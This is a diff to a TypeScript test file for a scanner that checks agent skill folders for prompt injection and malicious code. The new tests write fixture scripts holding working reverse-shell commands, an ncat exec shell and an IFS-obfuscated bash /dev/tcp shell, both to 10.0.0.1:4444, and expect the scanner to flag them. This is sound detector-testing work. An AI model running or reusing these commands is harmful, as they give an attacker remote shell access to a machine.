@@ -1,4 +1,4 @@
-import { linkSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, linkSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
@@ -597,6 +597,57 @@ describe("scanTrustTree", () => {
     );
   });
 
+  it("sanitizes drive-relative SkillSpector SARIF artifact URIs before fingerprinting", async () => {
+    skill("skills/clean", "# Clean\n");
+    const sarif = {
+      runs: [
+        {
+          results: [
+            {
+              ruleId: "skillspector.prompt-injection",
+              message: { text: "drive-relative SARIF uri" },
+              locations: [
+                {
+                  physicalLocation: {
+                    artifactLocation: { uri: "C:evil" },
+                    region: { startLine: 4 },
+                  },
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    };
+    const detector = fakeRunner((argv) => {
+      if (argv[0] !== "docker") return undefined;
+      if (argv[1] === "--version") return { code: 0, stdout: "Docker version 27\n" };
+      if (argv[1] === "image" && argv[2] === "inspect") {
+        return { code: 0, stdout: "sha256:skillspector\n" };
+      }
+      if (argv[1] === "run") return { code: 0, stdout: JSON.stringify(sarif) };
+      return undefined;
+    });
+
+    const result = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "vibe",
+      run: detector,
+    });
+
+    expect(result.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          code: "trust.prompt-injection",
+          detail: expect.stringContaining("skillspector.sarif:4"),
+          location: expect.objectContaining({ uri: "skillspector.sarif", startLine: 4 }),
+          fingerprint: expect.stringContaining(":skillspector:skillspector.sarif:4:"),
+        }),
+      ]),
+    );
+  });
+
   it("fails closed for enterprise required detectors and only degrades below enterprise", async () => {
     skill("skills/clean", "# Clean\n");
     const missingDocker = fakeRunner((argv) =>
@@ -691,6 +742,41 @@ describe("scanTrustTree", () => {
           verdict: "fail",
           code: "trust.malicious-code",
           location: expect.objectContaining({ uri: "scripts/nc.sh", startLine: 1 }),
+        }),
+      ]),
+    );
+  });
+
+  it("flags ncat exec reverse shells as malicious code", async () => {
+    skill("skills/clean", "# Clean\n");
+    write("scripts/ncat.sh", "ncat -e /bin/sh 10.0.0.1 4444\n");
+
+    const checks = await scanTrustTree(dir);
+
+    expect(checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "scripts/ncat.sh", startLine: 1 }),
+        }),
+      ]),
+    );
+  });
+
+  it("flags IFS-obfuscated bash reverse shells as malicious code", async () => {
+    skill("skills/clean", "# Clean\n");
+    const ifs = "$" + "{IFS}";
+    write("scripts/ifs.sh", `bash${ifs}-i${ifs}>&${ifs}/dev/tcp/10.0.0.1/4444${ifs}0>&1\n`);
+
+    const checks = await scanTrustTree(dir);
+
+    expect(checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "scripts/ifs.sh", startLine: 1 }),
         }),
       ]),
     );
@@ -863,6 +949,8 @@ describe("trustScanCommand", () => {
     expect(
       result.digests.find((digest) => digest.describe === "trust runtime advisory")?.text,
     ).toContain("aih-native, skillspector@docker");
+    expect(quarantineRoot).toBeDefined();
+    expect(existsSync(quarantineRoot ?? "")).toBe(false);
     if (quarantineRoot !== undefined) rmSync(quarantineRoot, { recursive: true, force: true });
   });
 
